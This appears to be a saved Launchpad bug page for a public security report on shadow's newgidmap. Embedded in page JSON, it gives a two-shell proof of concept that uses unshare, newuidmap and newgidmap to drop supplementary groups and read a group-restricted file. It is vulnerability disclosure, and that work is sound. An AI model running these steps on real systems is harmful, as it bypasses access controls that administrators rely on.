  <script id="json-cache-script">LP.cache = {"subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1729357", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1729357"}, "information_type_data": {"PUBLIC": {"description": "Everyone can see this information.\n", "name": "Public", "is_private": false, "order": 0, "description_css_class": "choice-description", "value": "PUBLIC"}, "PUBLICSECURITY": {"description": "Everyone can see this security related information.\n", "name": "Public Security", "is_private": false, "order": 1, "description_css_class": "choice-description", "value": "PUBLICSECURITY"}, "USERDATA": {"description": "Only shared with users permitted to see private user information.\n", "name": "Private", "is_private": true, "order": 3, "description_css_class": "choice-description", "value": "USERDATA"}, "PRIVATESECURITY": {"description": "Only the security group can see this information.\n ", "name": "Private Security", "is_private": true, "order": 2, "description_css_class": "choice-description", "value": "PRIVATESECURITY"}}, "total_comments_and_activity": 54, "bug_is_private": false, "related_features": {}, "first visible_recent_comment": -4, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1729357", "web_link": "https://bugs.launchpad.net/bugs/1729357", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1729357, "private": false, "information_type": "Public Security", "name": null, "title": "unprivileged user can drop supplementary groups", "description": "Distribution: Ubuntu 16.04.3 LTS\nKernel: 4.4.0-97-generic\nuidmap package version: 1:4.2-3.1ubuntu5.3\n\nThe newgidmap setuid executable allows any user to write a single mapping line to the gid_map of a process whose identity is the same as the calling process, as long as that mapping line maps the process's own GID outside of the user namespace to GID 0 inside the user namespace.\n\nNewgidmap will write the mapping regardless of the content of /proc/$process_being_mapped/setgroups, which will initially contain the string \"allow\". After this mapping is performed, and also after the process' uid_map is written with newuidmap, the process in the user namespace will be able to use the setgroups system call to drop supplementary groups.\n\nThis is possible even if there is no entry for the user in /etc/subgid, because no subordinate GIDs are actually being used.\n\nThis allows any user to circumvent the use of supplementary groups as blacklists, e.g. for some file owned by root:blacklist with permission bits 0604 (octal). Normally any process whose identity included the group \"blacklist\" in its supplementary groups would not be able to read that file. By performing this exploit using newgidmap, they can drop all supplementary groups and read that file.\n\nIf newgidmap was not available, unprivileged users would not be able to write a process's gid_map until writing \"deny\" to /proc/$pid/setgroups. A fix for this might be for newgidmap to check the content of /proc/$process_being_mapped/setgroups is \"deny\", but we have not tried to patch this ourselves.\n\nAn example using 2 login shells for a user named \"someone\" on Ubuntu Xenial, with the uidmap package installed:\n\nShell 1\n\nsomeone@ubuntu-xenial:~$ id\nuid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)\n\nsomeone@ubuntu-xenial:~$ ls -al /tmp/should_restrict\n-rw----r-- 1 root restricted 8 Nov  1 12:23 /tmp/should_restrict\n\nsomeone@ubuntu-xenial:~$ cat /tmp/should_restrict\ncat: /tmp/should_restrict: Permission denied\n\nsomeone@ubuntu-xenial:~$ unshare -U --setgroups allow # /proc/self/setgroups already contains 'allow', but let's be explicit\n\nnobody@ubuntu-xenial:~$ echo $$\n1878\n\nShell 2\n\nsomeone@ubuntu-xenial:~$ cat /etc/subuid\nlxd:100000:65536\nroot:100000:65536\nubuntu:165536:65536\n\nsomeone@ubuntu-xenial:~$ cat /etc/subgid\nlxd:100000:65536\nroot:100000:65536\nubuntu:165536:65536\n\n# There are no entries in /etc/sub{u,g}id for someone, but this doesn't matter that much as subordinate IDs are not being requested.\n\nsomeone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1\n\nsomeone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1\n\nBack to shell 1\n\nnobody@ubuntu-xenial:~$ id\nuid=0(root) gid=0(root) groups=0(root),65534(nogroup)\n\n# The presence of the \"nogroup\" supplementary group indicates that some unmapped GIDs are present as supplementary GIDs. The kernel knows that this process still has \"restricted\" in its supplementary groups, so it can't read the restricted file yet.\n\nnobody@ubuntu-xenial:~$ cat /tmp/should_restrict\ncat: /tmp/should_restrict: Permission denied\n\n# The process has gained CAP_SETGID in its user namespace by becoming UID 0. /proc/$pid/setgroups contains \"allow\", so it can call setgroups(2). By su-ing to root (itself, in the user namespace), it can drop the supplementary groups. It can't read /root/.bashrc as that file is owned by UID 0 in the initial user namespace, which creates some distracting error output but doesn't matter in this case.\n\nnobody@ubuntu-xenial:~$ su root\nsu: Authentication failure\n(Ignored)\nbash: /root/.bashrc: Permission denied\n\n# Supplementary groups have been dropped\n\nroot@ubuntu-xenial:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\n# It can read the restricted file\n\nroot@ubuntu-xenial:~# cat /tmp/should_restrict\ncontent", "owner_link": "https://bugs.launchpad.net/api/devel/~craigpivotal", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/bug_tasks", "duplicate_of_link": null, "date_created": "2017-11-01T14:33:01.240353+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/subscriptions", "date_last_updated": "2018-07-16T20:28:37.390928+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 272, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/attachments", "security_related": true, "latest_patch_uploaded": null, "tags": [], "date_last_message": "2018-07-16T20:28:37.091878+00:00", "number_of_duplicates": 0, "message_count": 37, "users_affected_count": 2, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/users_unaffected", "users_affected_count_with_dupes": 2, "other_users_affected_count_with_dupes": 2, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1729357/linked_merge_proposals", "http_etag": "\"7a442a7b01258692c75509f6c023193019692e1a-59279048b2885e86fad3e07af1a13bb04ac9c918\""}, "bugtask_data": {"2348429": {"assignee_vocabulary": "AllUserTeamsParticipation", "user_can_unassign": false, "bugtask_path": "/opensuse/+source/shadow/+bug/1729357", "assignee_value": null, "user_can_edit_status": false, "bug_title": "unprivileged user can drop supplementary groups", "user_can_edit_milestone": false, "prefix": "opensuse_shadow", "form_row_id": "task2348429", "target_is_product": false, "user_can_edit_importance": false, "assignee_is_team": null, "delete_link": "https://bugs.launchpad.net/opensuse/+source/shadow/+bug/1729357/+delete", "user_can_edit_assignee": false, "milestone_widget_items": "[]", "status_widget_items": "[]", "status_value": "Fix Released", "importance_value": "Medium", "hide_assignee_team_selection": true, "user_can_delete": false, "row_id": "tasksummary2348429", "assignee_vocabulary_filters": [], "targetname": "shadow (openSUSE)", "importance_widget_items": "[]", "milestone_value": null, "id": 2348429}, "2311191": {"assignee_vocabulary": "AllUserTeamsParticipation", "user_can_unassign": false, "bugtask_path": "/ubuntu/+source/shadow/+bug/1729357", "assignee_value": null, "user_can_edit_status": true, "bug_title": "unprivileged user can drop supplementary groups", "user_can_edit_milestone": false, "prefix": "ubuntu_shadow", "form_row_id": "task2311191", "target_is_product": false, "user_can_edit_importance": false, "assignee_is_team": null, "delete_link": "https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+delete", "user_can_edit_assignee": false, "milestone_widget_items": "[]", "status_widget_items": "[]", "status_value": "Confirmed", "importance_value": "Undecided", "hide_assignee_team_selection": true, "user_can_delete": false, "row_id": "tasksummary2311191", "assignee_vocabulary_filters": [], "targetname": "shadow (Ubuntu)", "importance_widget_items": "[]", "milestone_value": null, "id": 2311191}}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/shadow/+bug/1729357", "web_link": "https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1729357", "milestone_link": null, "status": "Confirmed", "importance": "Undecided", "assignee_link": null, "bug_target_display_name": "shadow (Ubuntu)", "bug_target_name": "shadow (Ubuntu)", "bug_watch_link": null, "date_assigned": null, "date_created": "2017-11-01T14:33:01.240353+00:00", "date_confirmed": "2017-11-14T01:56:19.567902+00:00", "date_incomplete": null, "date_in_progress": null, "date_closed": null, "date_left_new": "2017-11-14T01:56:19.567902+00:00", "date_triaged": null, "date_fix_committed": null, "date_fix_released": null, "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~craigpivotal", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/shadow", "title": "Bug #1729357 in shadow (Ubuntu): \"unprivileged user can drop supplementary groups\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/shadow/+bug/1729357/related_tasks", "is_complete": false, "http_etag": "\"e492690ec3c6943846356b8f5153b0b32a9eecb6-59a14deb4ab4d1ff388e3f0d2328ce5dd9189b57\""}, "initial_comment_batch_offset": 41};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 69 queries/external actions issued in 1.61 seconds

    Features: {'app.maintenance_message': None, 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'disclosure.dsp_picker.enabled': 'on', 'bugs.nominations.bug_supervisors_can_target': 'on', 'baselayout.careers_link.disabled': None, 'hard_timeout': '9000', 'js.yui_version': None, 'profiling.enabled': None}

    r0d8de2b

    -->

</html>

